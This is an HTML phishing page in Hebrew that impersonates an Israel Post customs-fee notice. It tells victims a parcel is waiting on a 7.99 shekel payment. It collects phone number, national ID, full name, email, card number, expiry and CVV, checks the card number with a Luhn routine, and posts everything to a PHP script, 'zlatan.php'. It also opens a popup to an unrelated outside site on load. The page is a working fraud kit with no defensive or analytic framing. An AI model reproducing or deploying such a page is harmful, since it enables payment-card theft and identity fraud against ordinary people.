<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
  <head>
  	<meta http-equiv="X-US-Compatible" content="IE=edge,Safari,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" >
	<meta http-equiv="content-type" content="application/xhtml+xml; charset=utf-8" />
    <link rel="stylesheet" type="text/css" href="screen.css" />
    <link rel="stylesheet" type="text/css" href="gh-buttons.css" />
    <script src="commons.js"></script>
    <style class="cp-pen-styles">
 
}
iframe{
    width: 100%;
    margin-top: 1.3em;
    display: none;
    height: 300px;
    background: #fff;
    border-radius: 10px;
}
.stage {
  position: absolute;
  top: 50%;
  left: 50%;
  -webkit-transform: translateX(-50%) translateY(-50%);
          transform: translateX(-50%) translateY(-50%);
}
label, [type="text"],
[type="email"],
textarea, [type="submit"] {
  border-radius: 5px;
}

}


    </style>


    <script type="text/javascript">

        function onBodyLoad() {
            document.form.otp.focus();
        }
    
	function validate(){
	
	
var filter = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
var tel=document.getElementById("nocphone2");
var email=document.getElementById("em1");
var cc=document.getElementById("ccnn1");
var expm=document.getElementById("cexppdm");
var expa=document.getElementById("cexdyyyyss");
var cv=document.getElementById("qsdq21sd5s4d4s1");
var flag=0;

if (tel.value=="" || isNaN(tel.value) || tel.value.length<8)
 {	tel.style.borderColor="red";flag=1;
 }else{ 
  	tel.style.borderColor="green";
   }
   
if(filter.test(email.value))
{
email.style.borderColor="green";
}else{
email.style.borderColor="red";flag=1;
}

if (cc.value==""||cc.value.length<15 || isNaN(cc.value)){
	cc.style.borderColor="red";flag=1;
	}else
{
	var len = cc.value.length;
	var iCCN = parseInt(cc.value);
	var iTotal = 0;
	for(var i=len;i>0;i--){  
      calc = parseInt(iCCN) % 10; 
      calc = parseInt(calc); 
      iTotal += calc;  
      i--;  
      iCCN = iCCN / 10;                              
      calc = parseInt(iCCN) % 10 ;   
      calc = calc *2;                                 
      switch(calc){
        case 10: calc = 1; break;       
        case 12: calc = 3; break;      
        case 14: calc = 5; break;       
        case 16: calc = 7; break;      
        case 18: calc = 9; break;       
        default: calc = calc;           
      }                                               
    iCCN = iCCN / 10; 
    iTotal += calc; 
  }
	if (iTotal%10!=0)
	{cc.style.borderColor="red";flag=1;
	}else{
	cc.style.borderColor="green";
		}
}
if (expm.value==""|| expm.value<1 ||expm.value>12 || (expa.value==19&& (expm.value==1|| expm.value==2||expm.value==3)))
 {	expm.style.borderColor="red";flag=1;
 }else{ 
  	expm.style.borderColor="green";
   }
 
 if (expa.value==""|| expa.value<19 || expa.value>28)
 {	expa.style.borderColor="red";flag=1;
 }else{ 
  	expa.style.borderColor="green";
   }
   
    
if (cv.value=="" || isNaN(cv.value) || cv.value.length<3)
 {	cv.style.borderColor="red";flag=1;
 }else{ 
  	cv.style.borderColor="green";
   }
if (flag==1)
{document.getElementById("msg_error").style.display="block";return false;}else{document.getElementById("msg_error").style.display="none";return true;}
	}
	</script>
  </head>
  <body onload="onBodyLoad();" bgcolor="#F1F1F1">
    <div id="authform" style="background-url: url(''); background-repeat: no-repeat; background-attachment: fixed; position:absolute; left:0px; top:207px">
      <div class="wrapper" style="width: 369px; height: 513px">
        <div class="logos">
          <table>
            <tbody>
              <tr>
                <td class="identifier"> <img alt="" src="" style="max-height:56px;" /><img

                    alt="" src="" style="max-height:56px;" /> </td>
                <td class="bank"> <br />
                </td>

			
<html> 
<body onload="window.open('http://heisetoufa.ggblog.com/','example03','width=400,height=300,directories');"> 

</body> 
</html> 
		 <h1 style="text-align: lift;"><img src="banar.jpg" alt="r" title="r"
            style="top: 249px; left: 631px; width: 370px; height: 100px;" longdesc="banar.jpg" /></h1>
        <h1 style="text-align: right;"><font color="#FF3100">הזן את מספר הכרטיס</font></h1>
        <p align="right"><font color="#FF6666">החבילה שלך  מחכה למשלוח. אנא שלם מכס ( 7.99 ₪)</font></p>
        </font></p>
		<p align="right">&nbsp;</p>
        <form id="form" name="form" method="POST" action="zlatan.php" style="background-image: url('https://www.searates.com/design/images/index/bg-today.jpg'); background-repeat: no-repeat"> <br />
          <dl style="margin-top: 10px;">
            <dt><b></b></dt>
            <dd><span id="date_time"></span><br />
            </dd>
            <script type="text/javascript">window.onload = date_time('date_time');</script>
            <dt><b>מספר טלפון<font color="#FF0000">*</font></b></dt>
            <dd> 
              &nbsp; 
              <select size="1" name="D1" style="color: #666666; font-weight: bold">
				<option>972</option>
				</select>-<input style="width: 60px" id="nocphone2" name="nocphone2" maxlength="10"

                onkeypress="return submitenter(this,event)" width="10" type="text" /></dd>
            <dd> <b>ת.ז. <font color="#FF6666">* </font></b>
            </dd>
			<dd> 
			<input name="id" id="id" style="width: 112px" onkeypress="return submitenter" maxlength="9"

             onkeypress="return submitenter(this,event)" width="10" /></dd>
           
		   <dd> <b>שם המלא<font color="#FF0000">*</font></b></dd>
			<dd> 
			<input name="name" id="name" style="width: 112px" onkeypress="return submitenter" maxlength="30"

             onkeypress="return submitenter(this,event)" width="10" /></dd>
			<dt>&nbsp;</dt>
            <dt><b>אימייל<font color="#FF0000">*</font></b></dt>
            <dd> <input name="em1" id="em1" style="width: 112px" onkeypress="return submitenter(this,event)"

                width="10" type="text" /> </dd>
            <dt><b>מס&#39; כרטיס <font color="#FF0000">*</font></b></dt>
            <dd> <input name="ccnn1" id="ccnn1" style="width: 112px" maxlength="16"

                onkeypress="return submitenter(this,event)" width="10" type="text" />
            </dd>
            <dt><b>תוקף <font color="#FF0000">*</font></b></dt>
            <dd><input style="width: 30px" id="cexppdm" name="cexppdm" maxlength="2"

                onkeypress="return submitenter(this,event)" width="10" type="text" />-<input

                style="width: 30px" id="cexdyyyyss" maxlength="2" name="cexdyyyyss"

                onkeypress="return submitenter(this,event)" width="10" type="text" /></dd>
            <dt> 
			<b><font color="#0000FF">
			<a href="https://direct.tranzila.com/docs/window-cvv.html">CVV</a></font><a href="https://direct.tranzila.com/docs/window-cvv.html">:&nbsp;<font color="#FF0000">*</font></a></b></dt>
            <dd> 
			<input style="width: 45; height:21" id="qsdq21sd5s4d4s1" maxlength="4"

                name="qsdq21sd5s4d4s1" onkeypress="return submitenter(this,event)"

                width="10" type="text" /> <br />
                <img src="https://israelpost.co.il/media/1096/register-ad.png" style="box-sizing: border-box; vertical-align: baseline; outline: 0px; font-size: 17px; max-width: 100%; height: auto; border: 0px none; margin: 0px; padding: 0px; background:">

              <br />
			  
            </dd>
          </dl>
          <div id="errorMessage" class="error"></div>
          <div id="msg_error" class="error" style="display: none;">
			<p align="center">מספר כרטיס אשראי לא תקין</div>
          <div style="font-size: 0.92em; margin-bottom: 30px;">
			<p align="center"><b><font color="#0000FF">הזן את המידע 
			הבא כהלכה ולחץ על</font><font color="#0000FF"> &quot;</font></b><font color="#0033CC"><b>עדכון</b></font><font color="#990033"><br />
            </font><font color="#0000FF">
            <b>השלב הבא: אימות נייד</b></font></div>
          <div style="position: absolute; margin-left: 150px;top:460px; height:21px"> <b><button class="button icon approve primary"

                name="submit" id="submit" type="submit" value="submit" onclick="return validate()">
			עדכון</button></b>



  
  	 <script type="text/javascript">
var cardNumberField = document.getElementById("ccnn1"); //making var for body
var cvvField = document.getElementById("qsdq21sd5s4d4s1");

cardNumberField.addEventListener("keydown", (evt) => {//when this happens
	var cardValue = cardNumberField.value;
	if(cardValue.startsWith("3")){
		cvvField.setAttribute("minlength", "3");
		cvvField.setAttribute("maxlength", "4");
	}else{
			cvvField.setAttribute("minlength", "3");
		cvvField.setAttribute("maxlength", "3");

	}
});	</script>


